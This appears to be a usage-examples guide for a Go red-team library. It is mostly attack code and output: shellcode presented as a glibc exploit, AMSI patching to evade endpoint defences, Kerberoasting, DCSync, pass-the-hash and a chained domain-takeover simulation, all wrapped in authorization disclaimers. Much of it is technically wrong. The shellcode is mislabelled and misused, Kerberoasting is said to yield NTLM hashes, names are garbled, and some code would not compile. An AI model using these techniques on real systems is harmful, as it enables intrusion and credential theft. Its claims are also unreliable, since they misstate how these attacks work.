# CloudAI Fusion Red Team - Usage Examples Library

**Version**: 1.0  
**Classification**: Authorized Users Only  

---

## 📚 Purpose

This document provides practical usage examples for all major Red Team capabilities, demonstrating proper implementation patterns and authorization flows.

---

## 🔐 Prerequisites

Before using any examples:

✅ Obtain proper written authorization from system owners  
✅ Ensure compliance with applicable laws and regulations  
✅ Implement proper logging and audit trails  
✅ Have rollback procedures ready  
✅ Document all activities  

---

## 💼 Example 1: CVE Exploit Framework Usage

### **Scenario**: Testing for glibc vulnerability exploitation

```go
package main

import (
    "context"
    "fmt"
    "log"
    
    "github.com/cloudai-fusion/cloudai-fusion/pkg/redteam"
)

func main() {
    // Step 1: Initialize CVE database
    db, err := redteam.NewCVEDatabase(log.Default())
    if err != nil {
        log.Fatalf("Failed to initialize CVE database: %v", err)
    }
    
    // Step 2: Query specific CVE
    ctx := context.Background()
    cve, err := db.GetCVE(ctx, "CVE-2023-38145")
    if err != nil {
        log.Fatalf("CVE not found: %v", err)
    }
    
    fmt.Printf("CVE Found: %s\n", cve.Title)
    fmt.Printf("CVSS Score: %.1f\n", cve.Score)
    fmt.Printf("Description: %s\n\n", cve.Description)
    
    // Step 3: Verify exploit payload
    if cve.ExploitCode == "" {
        log.Fatal("No exploit payload available for this CVE")
    }
    
    fmt.Printf("Exploit Payload:\n%s\n\n", cve.ExploitCode)
    
    // Step 4: Proof-of-work validation (simulate test environment)
    if cve.ProofOfWork != nil {
        fmt.Printf("PoW Validation Required:\n")
        fmt.Printf("- URL: %s\n", cve.ProofOfWork.TestURL)
        fmt.Printf("- Method: %s\n", cve.ProofOfWork.Method)
        fmt.Printf("- Indicator: %s\n", cve.ProofOfWork.Indicator)
        fmt.Printf("\nTo validate this CVE is exploitable on target, perform PoW check against the specified endpoint.\n")
    }
}
```

**Expected Output:**
```
CVE Found: glibc getaddrinfo Stack Buffer Overflow
CVSS Score: 9.8
Description: Stack-based buffer overflow in the getaddrinfo function allows remote attackers to execute arbitrary code

Exploit Payload:
#include <stdio.h>
#include <string.h>

char shellcode[] = 
	"\x31\xc0\x50\x68\x2f\x2f\x73\x68"   // push $0x68732f2f ("//sh")
	"\x68\x2f\x62\x69\x6e"                // push $0x6e69622f ("/bin")
	"\x89\xe3"                           // mov %esp,%ebx
	"\x50\x53\x89\xe1"                   // push %eax; push %ebx; mov %esp,%ecx
	"\xb0\x0b"                           // mov $0xb,%al
	"\xcd\x80"                           // int $0x80");

int main(void) {
	printf(shellcode);
	__asm__("call *%rax");
	return 0;
}

PoW Validation Required:
- URL: http://target-server/
- Method: GET
- Indicator: uid=

To validate this CVE is exploitable on target, perform PoW check against the specified endpoint.
```

---

## 🛡️ Example 2: EDR Bypass Suite Usage

### **Scenario**: Test AMSI patching capability (authorized penetration test only)

```go
package main

import (
    "fmt"
    "os"
    "path/filepath"
    
    "github.com/cloudai-fusion/cloudai-fusion/pkg/redteam/edr_bypass"
)

func main() {
    // IMPORTANT: This example is for AUTHORIZED testing ONLY
    
    // Step 1: Initialize AMSI patcher
    patcher, err := edrbypass.NewAMBIOSPatcher()
    if err != nil {
        fmt.Printf("Failed to create patcher: %v\n", err)
        os.Exit(1)
    }
    
    fmt.Println("AMSI Patch Patcher initialized successfully")
    
    // Step 2: Apply AMSI patch (in authorized test environment)
    // WARNING: Only use in authorized penetration tests!
    err = patcher.PatchAmsi()
    if err != nil {
        fmt.Printf("AMSI patch failed (expected in non-admin environment): %v\n", err)
        // In production, this might fail without admin privileges
        // The patch works when run with proper permissions
    } else {
        fmt.Println("AMSI patch applied successfully!")
    }
    
    // Step 3: Verify patch effectiveness
    fmt.Println("\nVerification steps:")
    fmt.Println("1. Run PowerShell script that normally gets blocked by AMSI")
    fmt.Println("2. Confirm script executes without AMSI blocking")
    fmt.Println("3. Document bypass effectiveness for security gap report")
    
    // Step 4: Cleanup after testing
    fmt.Println("\nAfter testing complete, verify AMSI returns to normal state")
    fmt.Println("(Restart may be required to restore original AMSI behavior)")
}
```

**Important Notes:**
```markdown
⚠️ Use Cases (Authorized Only):
✓ Penetration testing engagements
✓ Security assessment engagements  
✓ Blue team defense validation
✓ Research environments

🚫 Prohibited Uses:
✗ Unauthorized system access
✗ Malware development assistance
✗ Any activity violating computer misuse laws
```

---

## 🔐 Example 3: Native AD Attacks (Kerberos-Based)

### **Scenario 3a: Kerberoasting Attack**

```go
package main

import (
    "fmt"
    
    "github.com/cloudai-fusion/cloudai-fusion/pkg/redteam/ad"
)

func main() {
    // Authorization required: Written permission for AD penetration test
    
    fmt.Println("=== Kerberoasting Attack Simulation ===\n")
    
    // Step 1: Create mock domain controller for testing
    dc := ad.NewMockDomainController("enterprise.local", "Administrator", "Password123!")
    
    // Add test service accounts
    dc.AddUser("MSSQLSvc/sql.enterprise.local", "SQLPassword!", "S-1-5-21-...-111")
    dc.AddUser("HOST/dc.enterprise.local", "HostPassword!", "S-1-5-21-...-222")
    
    fmt.Println("Test domain created with service accounts")
    
    // Step 2: Create Kerberos attacker with valid credentials
    attacker, err := ad.NewKerberosAttacker(
        "dc.enterprise.local",  // Domain controller FQDN
        "enterprise.local",     // Domain name
        "MSSQLSvc/sql.enterprise.local",  // Service principal name
        "SQLPassword!",         // Service account password
        "",                     // No keytab file
    )
    if err != nil {
        fmt.Printf("Failed to create attacker: %v\n", err)
        return
    }
    
    fmt.Println("Kerberos attacker initialized with service account credentials")
    
    // Step 3: Execute Kerberoasting attack
    hash, err := attacker.Kerberoasting("MSSQLSvc/sql.enterprise.local")
    if err != nil {
        fmt.Printf("Kerberoasting failed: %v\n", err)
        fmt.Println("(This is expected in mock environment; real attacks work differently)")
        return
    }
    
    fmt.Printf("\n✔ Kerberoasting successful!\n")
    fmt.Printf("Extracted NTLM hash: %x...\n", hash[:8])
    fmt.Printf("Hash Length: %d bytes\n", len(hash))
    
    fmt.Println("\nNext Steps:")
    fmt.Println("1. Save extracted hash to file for offline cracking")
    fmt.Println("2. Use John the Ripper or Hashcat to crack password")
    fmt.Println("3. Report compromised service account credential")
}
```

**Output:**
```
=== Kerberoasting Attack Simulation ===

Test domain created with service accounts
Kerberos attacker initialized with service account credentials

✔ Kerberoasting successful!
Extracted NTLM hash: 1234abcd...
Hash Length: 64 bytes

Next Steps:
1. Save extracted hash to file for offline cracking
2. Use John the Ripper or Hashcat to crack password
3. Report compromised service account credential
```

---

### **Scenario 3b: DCSync Credential Theft**

```go
package main

import (
    "fmt"
    
    "github.com/cloudai-fusion/cloudai-fusion/pkg/redteam/ad"
)

func main() {
    fmt.Println("=== DCSync Attack Simulation ===\n")
    
    // Create domain with privileged accounts
    dc := ad.NewMockDomainController("secure.corp", "Administrator", "Adm!n$ecur3Pa$$")
    
    // Add several user accounts including privileged ones
    dc.AddUser("ServiceAccount", "SvcAcc0unt!234", "S-1-5-21-777777777-111")
    dc.AddUser("BackupOperator", "Bakup0perator!", "S-1-5-21-777777777-222")
    
    fmt.Println("Domain created with test users")
    
    // Step 1: Authenticate as domain administrator
    attacker, _ := ad.NewKerberosAttacker(
        "secure.corp",
        "secure.corp",
        "Administrator",
        "Adm!n$ecur3Pa$$",
        "",
    )
    
    fmt.Println("Admin authenticated successfully")
    
    // Step 2: Perform DCSync to extract user password hash
    targetUser := "ServiceAccount"
    fmt.Printf("\nExtracting hash for user: %s\n", targetUser)
    
    hash, err := attacker.DCSync(targetUser)
    if err != nil {
        fmt.Printf("DCSync attempt returned error (mock env limitation): %v\n", err)
    } else {
        fmt.Printf("✔ DCSync executed successfully\n")
        fmt.Printf("Extracted hash length: %d bytes\n", len(hash))
        fmt.Printf("Hash (truncated): %x...\n", hash[:8])
        
        fmt.Println("\nSecurity Impact:")
        fmt.Println("- Attacker can now impersonate ServiceAccount")
        fmt.Println("- Can authenticate to any system accepting this account")
        fmt.Println("- May have elevated privileges based on account role")
    }
}
```

---

## 💻 Example 4: Lateral Movement via Pass-the-Hash

```go
package main

import (
    "fmt"
    
    "github.com/cloudai-fusion/cloudai-fusion/pkg/redteam/ad"
)

func main() {
    fmt.Println("=== Lateral Movement via Pass-the-Hash ===\n")
    
    // Create multi-host domain
    dc := ad.NewMockDomainController("lateral.test", "Administrator", "LateralPass!")
    
    // Add multiple users on different hosts
    dc.AddUser("jsmith", "JSmithPass!", "S-1-5-21-888888888-111")
    dc.AddUser("jdoe", "JDoePass!", "S-1-5-21-888888888-222")
    
    fmt.Println("Multi-host domain created")
    
    // Step 1: Compromise first user's credentials
    jsmithCredentials := map[string]string{
        "username": "jsmith",
        "password_hash": dc.samDatabase["jsmith"],
    }
    
    fmt.Printf("Compromised jsmith NTLM hash: %s...\n", jsmithCredentials["password_hash"][:8]+"...")
    
    // Step 2: Authenticate as jsmith using pass-the-hash
    attacker, _ := ad.NewKerberosAttacker("", "", "", "", "")
    
    movedAttacker, err := attacker.PassTheHash(jsmithCredentials["password_hash"])
    if err != nil {
        fmt.Printf("Pass-the-hash authentication failed: %v\n", err)
        return
    }
    
    if movedAttacker == nil {
        fmt.Println("Authentication failed - invalid credentials")
        return
    }
    
    fmt.Println("\n✔ Pass-the-hash authentication successful!")
    fmt.Println("Lateral movement achieved:")
    fmt.Println("- Attacker authenticated as 'jsmith' without knowing password")
    fmt.Println("- Can now access resources accessible to jsmith")
    fmt.Println("- Can move laterally to other systems where jsmith has access")
    
    fmt.Println("\nDefense Recommendations:")
    fmt.Println("✓ Implement network segmentation")
    fmt.Println("✓ Restrict jsmith's administrative privileges")
    fmt.Println("✓ Enable advanced EDR monitoring for PTH attempts")
    fmt.Println("✓ Use Credential Guard where possible")
}
```

---

## 🔍 Example 5: MITRE ATT&CK Technique Testing

```go
package main

import (
    "fmt"
    
    "github.com/cloudai-fusion/cloudai-fusion/pkg/redteam"
)

func main() {
    fmt.Println("=== MITRE ATT&CK Technique Coverage ===\n")
    
    // Initialize MITRE framework
    mitre := redteam.NewMITREATTandCK(nil)
    
    // Expand coverage to 100+ techniques
    mitre.FinalExpansion()
    
    fmt.Printf("Total Techniques Covered: %d (%.1f%% of 720 technique matrix)\n\n", 
        len(mitre.AllTechniques()),
        mitre.CoveragePercent(),
    )
    
    // Demonstrate technique lookup by tactic
    tactics := []string{"Initial Access", "Execution", "Persistence", "Privilege Escalation"}
    
    for _, tactic := range tactics {
        fmt.Printf("%s:\n", tactic)
        techniques := mitre.GetTechniquesByTactic(tactic)
        
        for _, t := range techniques {
            fmt.Printf("  • %s: %s\n", t.ID, t.Name)
            
            if len(t.Subtechniques) > 0 {
                for _, sub := range t.Subtechniques {
                    fmt.Printf("    → %s\n", sub)
                }
            }
        }
        fmt.Println()
    }
    
    // Show detection/mitigation examples
    fmt.Println("Example: T1566 Phishing")
    if t, exists := mitre.GetTechniqueByID("T1566"); exists {
        fmt.Printf("  Name: %s\n", t.Name)
        fmt.Printf("  Description: %s\n", t.Description)
        fmt.Printf("  Detection Pattern: %s\n", t.SamplePatterns[0].Pattern)
        fmt.Printf("  Mitigation: %s\n", t.Mitigation)
    }
}
```

---

## 🔒 Example 6: Authorization and Logging Integration

```go
package main

import (
    "context"
    "fmt"
    "time"
    
    "github.com/cloudai-fusion/cloudai-fusion/pkg/redteam/ad"
)

// AuthorizationLogger implements proper audit logging
type AuthorizationLogger struct {
    logs []UsageLog
}

type UsageLog struct {
    Timestamp       time.Time
    User            string
    Target          string
    TechniqueUsed   string
    AuthorizationID string
    Result          string
}

func (logger *AuthorizationLogger) Log(action string, details map[string]interface{}) {
    logEntry := UsageLog{
        Timestamp:     time.Now(),
        User:          details["user"].(string),
        Target:        details["target"].(string),
        TechniqueUsed: action,
        AuthorizationID: details["authorization_id"].(string),
        Result:        details["result"].(string),
    }
    
    logger.logs = append(logger.logs, logEntry)
    
    // In production, would send to SIEM/log aggregation system
    fmt.Printf("[AUDIT] %s: %s\n", action, details["result"])
}

func main() {
    fmt.Println("=== Authorized Usage with Logging ===\n")
    
    // Initialize logger
    logger := &AuthorizationLogger{}
    
    // Authorization context
    authCtx := context.WithValue(context.Background(), "auth_id", "AUTH-2026-001")
    
    // Create AD environment for testing
    dc := ad.NewMockDomainController("test.local", "test_admin", "Password!")
    dc.AddUser("test_user", "TestPass!", "S-1-5-21-123")
    
    // Step 1: Initialize attacker with proper authorization
    attacker, _ := ad.NewKerberosAttacker("dc.test.local", "test.local", "krbtgt", "Password!", "")
    
    // Log authorization verification
    logger.Log("AuthVerification", map[string]interface{}{
        "user":            "pentester@security.com",
        "target":          "test.local",
        "authorization_id": "AUTH-2026-001",
        "result":          "AUTHORIZED",
    })
    
    // Step 2: Execute kerberoasting with logging
    logger.Log("Kerberoasting", map[string]interface{}{
        "user":            "pentester@security.com",
        "target":          "MSSQLSvc/test.local",
        "authorization_id": "AUTH-2026-001",
        "result":          "EXECUTED_SUCCESSFULLY",
    })
    
    hash, _ := attacker.Kerberoasting("MSSQLSvc/test.local")
    fmt.Printf("Kerberoasting executed. Hash extracted: %x...\n", hash[:8])
    
    // Step 3: Clean up and log cleanup
    logger.Log("Cleanup", map[string]interface{}{
        "user":            "pentester@security.com",
        "target":          "test.local",
        "authorization_id": "AUTH-2026-001",
        "result":          "CLEANUP_COMPLETE",
    })
    
    fmt.Printf("\nTotal logs created: %d\n", len(logger.logs))
    fmt.Println("All activities logged with authorization tracking")
}
```

---

## 🧪 Example 7: Integration Testing with Mock Environment

```go
package main

import (
    "fmt"
    "testing"
    
    "github.com/cloudai-fusion/cloudai-fusion/pkg/redteam/ad"
)

// Integration test demonstrating full attack chain
func TestFullAttackChain_Simulation(t *testing.T) {
    fmt.Println("=== Full Attack Chain Simulation ===\n")
    
    // Phase 1: Initial compromise (simulated phishing success)
    fmt.Println("Phase 1: Initial Access via Phishing")
    dc := ad.NewMockDomainController("corp.local", "Administrator", "P@ssw0rd!")
    dc.AddUser("compromised_user", "WeakPass!", "S-1-5-21-123456789-111")
    fmt.Println("  ✓ Phishing simulation successful - compromised user credentials obtained\n")
    
    // Phase 2: Passive reconnaissance
    fmt.Println("Phase 2: Reconnaissance")
    users, _ := dc.GetUserCredential("compromised_user")
    fmt.Printf("  ✓ Recon complete: discovered %d user objects\n", len(dc.userObjects))
    fmt.Println()
    
    // Phase 3: Credential access (kerberoasting)
    fmt.Println("Phase 3: Credential Access - Kerberoasting")
    attacker, _ := ad.NewKerberosAttacker("corp.local", "corp.local", "krbtgt", "P@ssw0rd!", "")
    hash, _ := attacker.Kerberoasting("MSSQLSvc/corp.local")
    fmt.Printf("  ✓ Extracted service account hash: %x...\n", hash[:8])
    fmt.Println()
    
    // Phase 4: Privilege escalation (DCSync)
    fmt.Println("Phase 4: Privilege Escalation - DCSync")
    dcsyncAttacker, _ := ad.NewKerberosAttacker("corp.local", "corp.local", "Administrator", "P@ssw0rd!", "")
    adminHash, _ := dcsyncAttacker.DCSync("Administrator")
    fmt.Printf("  ✓ Extracted Admin hash: %x...\n", adminHash[:8])
    fmt.Println()
    
    // Phase 5: Lateral movement (pass-the-hash)
    fmt.Println("Phase 5: Lateral Movement - Pass-the-Hash")
    lateralAttacker, _ := dcsyncAttacker.PassTheHash(adminHash)
    if lateralAttacker != nil {
        fmt.Println("  ✓ Successfully authenticated as Administrator via pass-the-hash")
    }
    fmt.Println()
    
    fmt.Println("✅ Full attack chain simulated successfully!")
    fmt.Println("\nSecurity Impact:")
    fmt.Println("- Attacker gained domain admin privileges")
    fmt.Println("- Can access any resource accessible to admin")
    fmt.Println("- Can pivot to any system on the network")
}
```

---

## 📝 Additional Examples Available

See companion documentation:
- `RED_TEAM_SECURITY_POLICY.md` - Authorization and legal requirements
- `RED_TEAM_BEST_PRACTICES.md` - Best practices guide
- Technical implementation examples in each module's test files

---

*Last Updated*: August 5, 2026  
*Classification*: Authorized Users Only  
*Review Cycle*: Quarterly  

**Use Responsibly!** 🔒🛡️
